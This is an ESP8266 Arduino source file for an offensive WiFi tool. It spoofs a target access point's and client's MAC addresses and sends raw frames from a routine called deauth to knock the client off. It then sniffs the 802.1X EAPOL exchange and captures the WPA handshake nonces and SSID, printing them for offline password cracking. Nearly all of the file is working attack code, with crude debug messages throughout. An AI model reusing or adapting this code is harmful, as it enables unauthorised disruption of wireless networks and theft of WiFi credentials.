#define ets_uart_printf Serial.printf 
#include <ESP8266WiFi.h>
extern "C" {
 #include <lwip/netif.h>
 #include <lwip/pbuf.h>
 #include <osapi.h>
 #include <mem.h>
 #include <user_interface.h>
 #include "wifi_raw.h"
}
#include "handshake.h"

#define LWIP_OPEN_SRC

#define STATION_IF  0x00
#define STATION_MODE  0x01

#define SOFTAP_IF 0x01
#define SOFTAP_MODE 0x02


#define DIFF(a,b) ((a) < (b) ? (b-a) : (a-b))


//max amount of recordings of KEY2 before it ignores
#define MAXKEY2RECORDINGS 32

//max time between deauth and key2
#define MAXKEY2TIME 1 * 1000     //seconds
//max time between key2 and key3
#define MAXKEY3TIME 0.2 * 1000000  //seconds

//max calculated time (based on packet datatime thing, sucks)
#define MAXTIMEMISMATCH 500 * 1000 //milliseconds





//ETSTimer timer;

/* function that sends the raw packet.
   Note: the actual packet sent over the air may be longer because
   the driver functions seem to allocate memory for the whole IEEE-802.11
   header even if the packet is shorter...

   Currently, packets of length less than or equal to 18 bytes have
   additional bytes over the air until it reaches 19 bytes. For larger packets,
   the length should be correct. */
void ICACHE_FLASH_ATTR send_packet(void *arg)
{
  char packet[64];

  packet[0] = '\xde';
  packet[1] = '\xad';
  packet[2] = '\xbe'; /* This will become \x00 */
  packet[3] = '\xef'; /* This too. */

  wifi_send_raw_packet(packet, sizeof packet);
  wifi_set_channel(9);
}


void serial_print_frame(struct RxPacket *pkt) {
  Serial.print("\n");
    //static int counter = 0;
  uint16 len;
  uint16 i, j;

  len = pkt->rx_ctl.legacy_length;
  //ets_uart_printf("Recv callback #%d: %d bytes\n", counter++, len);
  //ets_uart_printf("Channel: %d PHY: %d\n", pkt->rx_ctl.channel, wifi_get_phy_mode());

  i = 0;

  while (i < len / 16) {
    ets_uart_printf("%05x0 ", i);

    for (j = 0; j < 8; j++) {
      ets_uart_printf("%02x ", pkt->data[16 * i + 2 * j]);
      ets_uart_printf("%02x ", pkt->data[16 * i + 2 * j + 1]);
    }

    ets_uart_printf("\t");

    for (j = 0; j < 16; j++) {
      if ((pkt->data[16 * i + j] >= ' ') && (pkt->data[16 * i + j] <= '~'))
        ets_uart_printf("%c", pkt->data[16 * i + j]);
      else
        ets_uart_printf(".");
    }

    ets_uart_printf("\n");
    ++i;
  }

  if (len % 16 != 0) {
    ets_uart_printf("%05x0 ", i);

    for (j = 0; j < len % 16; j++) {
      ets_uart_printf("%02x ", pkt->data[16 * i + j]);

    }

    for (; j < 16; j++) {
      ets_uart_printf(" ");
      ets_uart_printf(" ");

      if (j % 2 == 1)
        ets_uart_printf(" ");
    }

    ets_uart_printf("\t");

    for (j = 0; j < len % 16; j++) {
      if ((pkt->data[16 * i + j] >= ' ') && (pkt->data[16 * i + j] <= '~'))
        ets_uart_printf("%c", pkt->data[16 * i + j]);
      else
        ets_uart_printf(".");
    }
  }
}


void serial_print_mac() {
  uint8_t mac[6];
  WiFi.macAddress(mac);
  Serial.print("MAC=");
  for (char i = 0; i < 6; i++) Serial.printf("%02x ", (char*)mac[i]);
  Serial.println();
}







bool match_data(struct RxPacket* pkt, uint8_t* arr, uint16_t offset, uint16_t len) {
  for (char i = 0; i < len; i++) if (pkt->data[offset+i] != arr[i]) return false;
  return true;
}
bool data_area_not_empty(struct RxPacket* pkt, uint16_t offset, uint16_t len) {
  for (char i = 0; i < len; i++) if (pkt->data[offset+i]) return true;
  return false;
}

void printHandshake(struct Handshake handshake) {
  for (char i = 0; i < 6; i++) Serial.printf("%02x", (uint8_t*)handshake.APMAC[i]);
  Serial.print(" ");
  for (char i = 0; i < 6; i++) Serial.printf("%02x", (uint8_t*)handshake.clientMAC[i]);
  Serial.print(" ");
  for (char i = 0; i < 32; i++) Serial.printf("%02x", (uint8_t*)handshake.ANonce[i]);
  Serial.print(" ");
  for (char i = 0; i < 32; i++) Serial.printf("%02x", (uint8_t*)handshake.SNonce[i]);
  Serial.print(" ");
  Serial.write((char*)handshake.SSID);
  Serial.print("\n");
}







Handshake handshake;



void finishHandshake() {
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  Serial.println("FUCK THIS SHIT IM OUT WHOOOHOOO");
  printHandshake(handshake);
  ESP.deepSleep(0);
  delay(1);
}


void identifySSID(struct RxPacket* pkt) {
  if (handshake.SSID[0] || pkt->data[0] != 0x80) return;
  if (!match_data(pkt, handshake.APMAC, 0x0A, 6)) return;
  
  uint16_t start = 0x24;
  while (start < pkt->rx_ctl.legacy_length) {
    if (pkt->data[start] == 0 && pkt->data[start+1] > 0) {
      memcpy(handshake.SSID, pkt->data + start + 2, pkt->data[start+1]);
      Serial.print("beacon identified: ");
      Serial.write((char*)handshake.SSID);
      Serial.print("\n");
      return;
    }
    start += pkt->data[start+1] + 2;
  }
}









uint32_t startTime;
uint32_t key2Time = 0;
uint8_t totalKey2 = 0;
uint8_t* ANonces[MAXKEY2RECORDINGS];
uint32_t key2Timings[MAXKEY2RECORDINGS];

void freeKey2s() {
  key2Time = 0;
  
  while (totalKey2 > 0) {
    free(ANonces[totalKey2]);
    totalKey2--;
  }
  
  free(ANonces[0]);
}





void my_recv_cb(struct RxPacket* pkt)
{
  
  if ((pkt->data[0] & B01001100) ^ B00001000) {
    identifySSID(pkt);
    return; //type: data, subtype: not nodata, match Bx0xx10xx
  }

  uint16_t start = 0x20;  //start of data
  if (pkt->data[0] & B10000000) start += 2; //QoS is longer


  //needs some additional filtering, sometimes it picks up random data packages with 88 8e on that location...
  if (pkt->data[start-2] != 0x88 || pkt->data[start-1] != 0x8e) return; //only interested in type: 802.1x authentication
  if (pkt->data[start+1] != 0x03) return; //not a key


  //serial_print_mac();
  serial_print_frame(pkt);
  
  digitalWrite(LED_BUILTIN, LOW);
  
  if (!((pkt->data[1] & B11) ^ B10) && match_data(pkt, handshake.APMAC, 0x10, 6)) { //waiting for key 1 or 3 (byte 1: Bxxxxxx10)
    //for (char i = 0; i < 6; i++) if (pkt->data[0x10+i] != handshake.APMAC[i]) return; //source needs to be AP

    if (!(pkt->data[start+6] & B01000000)) { //message 1: install bit not set
      //KEY1
      Serial.println("\t\t\t\tKEY1");
      
    } else {
      if (!key2Time) {
        Serial.println("\t\t\t\tKEY3 in the wild");
        return;
      }
      
      //KEY3
      uint32_t received2Time = micros() - key2Time - (((pkt->data[3]) << 8) + pkt->data[2]); //time when AP received key2 + 2<<30
      Serial.print("\t\t\t\tKEY3 ()time: ");
      Serial.println(received2Time);


      uint32_t lowest = ((uint32_t)0) - 1;
      uint8_t* lowestKey2Value = ANonces[0];
      for (uint8_t i = 0; i < totalKey2; i++) {
        Serial.print("diff with key ");
        Serial.print(i);
        Serial.print(": ");
        uint32_t val = DIFF(received2Time, key2Timings[i]);
        Serial.println(val);
        if (val <= lowest) {
          lowest = val;
          lowestKey2Value = ANonces[i];
        }
        free(ANonces[i]);
      }
      totalKey2 = 0;
      key2Time = 0;
      
      if (MAXTIMEMISMATCH < lowest) {
        Serial.print("that shit took too long, fuck it ()");
        Serial.println(lowest);
        return;
      }

      Serial.println("I ACTUALLY FUCKING DID IT OMG");

      memcpy(handshake.ANonce, lowestKey2Value, 32); 
      memcpy(handshake.SNonce, pkt->data + start + 0x11, 32); 
      finishHandshake();
      
    }
    
  } else if (!((pkt->data[1] & B11) ^ B01) && match_data(pkt, handshake.clientMAC, 0x0A, 6)) {                        //waiting for key 2 or 4 (byte 1: Bxxxxxx01)
    
    if (data_area_not_empty(pkt, start + 0x11, 0x20)) {
      //KEY2
      if (!key2Time) {
        key2Time = micros() - (2 << 30); //pretend it is earlier so we dont underflow later, this will probably underflow now but thats fine i hope
        Serial.println("\t\t\t\tKEY2 FOUND NICE START GOGOGOGO");
        
      }

      if(totalKey2 > MAXKEY2RECORDINGS) return;
      
      key2Timings[totalKey2] = micros() - key2Time;
      Serial.print("\t\t\t\tA KEY2 OH BOY ()time: ");
      Serial.println(key2Timings[totalKey2]);
      
      
      ANonces[totalKey2] = (uint8_t*)malloc(32 * sizeof(uint8_t));
      memcpy(ANonces[totalKey2], pkt->data + start + 0x11, 32);
      totalKey2++;

        
    } else {
      //KEY4
      Serial.println("\t\t\t\tKEY4");
      
    }
    
  }


  
}









// Packet buffer
uint8_t packet_buffer[64];

/*
// DeAuth template
uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};*/
uint8_t template_da[59] = { 
  0x80, 0x00, 
  0x00, 0x00, //beacon
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //destination: broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
  0xc0, 0x6c, 
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
  0xe8, 0x03, 
  0x01, 0x04, 
  0x00, 0x08, //SSID size
  0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
  0x01, 0x08, 0x82, 0x84,
  0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
  0x03 //channel
};

uint16_t seqn = 0; //for now, if it doesnt work ill fix it :D

uint8_t* create_packet(uint8_t* target, uint8_t* AP) {


  memcpy(packet_buffer, template_da, 59);
/*  
  memcpy(packet_buffer + 4, target, 6); //Destination
  
  memcpy(packet_buffer + 10, AP, 6); //Sender
  memcpy(packet_buffer + 16, AP, 6); //BSS
  
  packet_buffer[22] = seqn % 0xFF;
  packet_buffer[23] = seqn / 0xFF;*/

  //seqn += 0x10; //keep it on zero, see what happens

  return packet_buffer;
}




void deauth() {
  Serial.print(".");
  send_packet(create_packet(handshake.clientMAC, handshake.APMAC)); //kick em off
}





void loop() { }



//TODO: figure out a way to stop the thing from actually hosting a hotspot
//TODO: dynamic target selection
//TODO: dynamic ap selection

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  Serial.begin(115200);
  
  uint8_t APMAC[6]     = {0x5C, 0x35, 0x3B, 0x45, 0x09, 0x3A};
  //uint8_t clientMAC[6] = {0x60, 0x01, 0x94, 0x82, 0x7F, 0x32}; //esp
  uint8_t clientMAC[6] = {0x54, 0xDC, 0x1D, 0xFF, 0x15, 0x2F}; //phone

  memcpy(handshake.APMAC    , APMAC    , 6*sizeof(uint8_t));
  memcpy(handshake.clientMAC, clientMAC, 6*sizeof(uint8_t));
  
  wifi_set_macaddr(SOFTAP_IF, handshake.APMAC);
  wifi_set_macaddr(STATION_IF, handshake.clientMAC);
  wifi_set_channel(9);
  
  //wifi_set_phy_mode(PHY_MODE_11G);
  wifi_set_opmode(STATIONAP_MODE);
  wifi_raw_set_recv_cb(my_recv_cb);

  deauth();
  startTime = millis();

  
  while (true) { 
    yield();

    if (!key2Time && (millis() - startTime) > MAXKEY2TIME) { //MOVE ON WITH UR LIFE

      //TODO: implement some sort of counter, maybe target is invulnerable
      deauth();
      startTime = millis();
      
    } else if (key2Time && (millis() - key2Time) > MAXKEY3TIME) { //key 3's not coming, fuck it reset
      freeKey2s();
    }
    
  }
}

